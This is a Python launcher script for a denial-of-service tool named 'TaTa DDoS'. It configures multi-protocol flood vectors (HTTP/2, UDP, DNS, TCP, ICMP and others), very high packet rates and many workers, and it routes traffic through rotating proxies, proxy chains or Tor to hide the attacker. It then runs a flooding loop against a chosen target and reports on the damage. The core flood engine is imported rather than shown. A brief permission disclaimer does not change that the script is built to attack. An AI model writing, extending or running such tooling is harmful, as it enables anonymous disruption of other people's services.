#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# TaTa DDoS - By nezX (https://github.com/nezX-project/tata-ddos)
# Version 1.1.0 - Proxy Integration

import os
import sys
import time
import json
import argparse
import asyncio
import signal
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.panel import Panel
from rich.text import Text
from rich.layout import Layout
from rich.live import Live
from multiprocessing import cpu_count

# Import our core modules
from tata_core import TATAEngine, load_vectors, validate_target
from tata_proxy import ProxyManager

CONSOLE = Console()
VERSION = "1.1.0"

BANNER = r"""
████████╗ █████╗ ████████╗ █████╗     ██████╗  ██████╗ ███████╗
╚══██╔══╝██╔══██╗╚══██╔══╝██╔══██╗    ██╔══██╗██╔═══██╗██╔════╝
   ██║   ███████║   ██║   ███████║    ██║  ██║██║   ██║███████╗
   ██║   ██╔══██║   ██║   ██╔══██║    ██║  ██║██║   ██║╚════██║
   ██║   ██║  ██║   ██║   ██║  ██║    ██████╔╝╚██████╔╝███████║
   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                  
            ──═╡  TaTa DDoS  ╞══─  v1.1.0  ──═╡  By nezX  ╞══─
         ────═╡  https://github.com/nezX-project/tata-ddos  ╞────
"""

def signal_handler(sig, frame):
    CONSOLE.print("\n[bold red]⚠️  Interrupt received. Shutting down gracefully...[/]")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def show_banner():
    CONSOLE.print(Panel(Text(BANNER, style="bold red"), border_style="cyan", width=90))
    CONSOLE.print("[bold yellow]⚠️  WARNING:[/] Use only on systems you own or have explicit written permission to test.", style="dim")
    CONSOLE.print("[bold cyan]🔗 GitHub:[/] [link=https://github.com/nezX-project/tata-ddos]https://github.com/nezX-project/tata-ddos[/link]\n")
    CONSOLE.print(f"[dim]Loaded {VERSION} - Proxy features enabled[/]\n")

def parse_args():
    parser = argparse.ArgumentParser(
        description="TaTa DDoS - Enterprise-grade stress testing framework with proxy support",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python tata.py --target shop.example.com --port 443 --vectors all --workers 500
  python tata.py --target api.test.com --proxy-file proxies.txt --proxy-type socks5 --proxy-rotation random
  python tata.py --target 10.0.0.1 --port 80 --vectors http2 --proxy-type http --sticky-proxy
        """
    )
    
    # Target options
    parser.add_argument("--target", required=True, help="Target IP or domain")
    parser.add_argument("--port", type=int, default=443, help="Target port (default: 443)")
    
    # Attack options
    parser.add_argument("--vectors", nargs="+", default=["all"], 
                        help="Attack vectors: all, http2, ghost, udp, dns, mqtt, coap, sip, tcp, icmp")
    parser.add_argument("--workers", type=int, default=cpu_count() * 4, 
                        help=f"Number of worker threads (default: {cpu_count()*4})")
    parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("--rate", type=int, default=500000, help="Packets/sec per worker (default: 500000)")
    
    # Proxy options - NEW
    parser.add_argument("--proxy-file", help="File with proxies (format: ip:port or ip:port:user:pass)")
    parser.add_argument("--proxy-type", default="none", 
                        choices=["socks4", "socks5", "http", "https", "none"],
                        help="Proxy protocol (default: none)")
    parser.add_argument("--proxy-rotation", default="random", 
                        choices=["random", "round-robin", "latency-based"],
                        help="Proxy rotation strategy (default: random)")
    parser.add_argument("--sticky-proxy", action="store_true", 
                        help="Use same proxy for entire session")
    parser.add_argument("--proxy-refresh", type=int, default=0,
                        help="Refresh proxy list every N seconds (0 = disabled)")
    parser.add_argument("--tor", action="store_true", 
                        help="Route through Tor (localhost:9050)")
    parser.add_argument("--chain-length", type=int, default=1,
                        help="Number of proxy hops (1-5, default: 1)")
    
    # Report options
    parser.add_argument("--report", default="tata_report.pdf", help="Output report file (default: tata_report.pdf)")
    parser.add_argument("--dry-run", action="store_true", help="Simulate on localhost (safe mode)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    
    return parser.parse_args()

async def main():
    show_banner()
    args = parse_args()
    
    # Display proxy configuration
    if args.tor:
        CONSOLE.print("[bold magenta]🌀 Tor mode enabled - routing through 127.0.0.1:9050[/]")
        args.proxy_type = "socks5"
        args.proxy_file = None  # Force Tor's default
    
    if args.proxy_type != "none" or args.proxy_file:
        CONSOLE.print(f"[cyan]🌐 Proxy mode: {args.proxy_type.upper()} with {args.proxy_rotation} rotation[/]")
        if args.sticky_proxy:
            CONSOLE.print("[yellow]🔗 Sticky proxy enabled (session persistence)[/]")
        if args.chain_length > 1:
            CONSOLE.print(f"[magenta]🔁 Proxy chaining: {args.chain_length} hops[/]")
        if args.proxy_refresh > 0:
            CONSOLE.print(f"[blue]🔄 Proxy refresh every {args.proxy_refresh}s[/]")
    else:
        CONSOLE.print("[dim]Direct connection (no proxies)[/]")
    
    # Validate target
    if not args.dry_run:
        try:
            validate_target(args.target, args.port)
        except Exception as e:
            CONSOLE.print(f"[red]❌ Target validation failed: {e}[/]")
            CONSOLE.print("[yellow]Use --dry-run for local testing[/]")
            return
    
    # Initialize engine
    engine = TATAEngine(
        target=args.target,
        port=args.port,
        vectors=load_vectors(args.vectors),
        worker_count=args.workers,
        duration=args.duration,
        rate=args.rate,
        dry_run=args.dry_run,
        proxy_file=args.proxy_file,
        proxy_type=args.proxy_type if args.proxy_type != "none" else None,
        proxy_rotation=args.proxy_rotation,
        sticky_proxy=args.sticky_proxy,
        proxy_refresh=args.proxy_refresh,
        tor_mode=args.tor,
        chain_length=args.chain_length,
        verbose=args.verbose
    )
    
    # Show attack profile table
    table = Table(title="⚡ Attack Profile", style="green")
    table.add_column("Parameter", style="cyan")
    table.add_column("Value", style="magenta")
    table.add_row("Target", f"{args.target}:{args.port}")
    table.add_row("Vectors", ", ".join(args.vectors))
    table.add_row("Workers", str(args.workers))
    table.add_row("Duration", f"{args.duration}s")
    table.add_row("Rate", f"{args.rate:,} pps/worker")
    table.add_row("Proxy", args.proxy_type.upper() if args.proxy_type != "none" else "None")
    if args.proxy_type != "none":
        table.add_row("Proxy Rotation", args.proxy_rotation)
        table.add_row("Proxy Count", str(len(engine.proxy_manager.proxies)) if engine.proxy_manager else "0")
    CONSOLE.print(table)
    
    # Countdown
    CONSOLE.print("\n[bold red]🔥 Launching in 3 seconds... Hit Ctrl+C to abort.[/]")
    for i in range(3, 0, -1):
        CONSOLE.print(f"[yellow]{i}...[/]")
        time.sleep(1)
    
    # Execute attack with progress bar
    start_time = time.time()
    try:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            transient=False
        ) as progress:
            task = progress.add_task("[red]💥 Flooding target...[/]", total=args.duration)
            
            async for update in engine.run():
                elapsed = time.time() - start_time
                progress.update(
                    task, 
                    advance=1,
                    description=f"[red]💥 PPS: {update.get('pps', 0):,} | Errors: {update.get('errors', 0)} | Proxies: {update.get('active_proxies', 0)}[/]"
                )
                
                if update.get('pps', 0) > 1_000_000:
                    progress.console.print("[bold yellow]⚠️  Over 1M PPS - target is likely struggling![/]")
                
                if elapsed > args.duration:
                    break
                
                if args.proxy_refresh > 0 and int(elapsed) % args.proxy_refresh == 0:
                    progress.console.print("[blue]🔄 Refreshing proxy pool...[/]")
                    engine.proxy_manager.refresh_proxies()
    
    except KeyboardInterrupt:
        CONSOLE.print("\n[bold red]⛔ Aborted by user![/]")
    except Exception as e:
        CONSOLE.print(f"[red]❌ Attack error: {e}[/]")
        if args.verbose:
            import traceback
            traceback.print_exc()
    finally:
        CONSOLE.print("\n[bold green]✅ Attack completed or stopped.[/]")
        
        # Generate report
        CONSOLE.print("[cyan]📊 Generating report...[/]")
        try:
            report_file = engine.generate_report(args.report)
            CONSOLE.print(f"[bold green]📄 Report saved: {report_file}[/]")
        except Exception as e:
            CONSOLE.print(f"[red]❌ Report generation failed: {e}[/]")
        
        # Summary
        CONSOLE.print("\n[bold magenta]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/]")
        CONSOLE.print("[bold cyan]💀 TaTa DDoS - Mission Complete[/]")
        CONSOLE.print(f"[dim]Total time: {time.time() - start_time:.2f}s[/]")
        CONSOLE.print("[dim]Stay lethal, stay legal. – nezX[/]")
        CONSOLE.print("[bold magenta]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/]")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        CONSOLE.print("\n[red]Goodbye, fren.[/]")
        sys.exit(0)
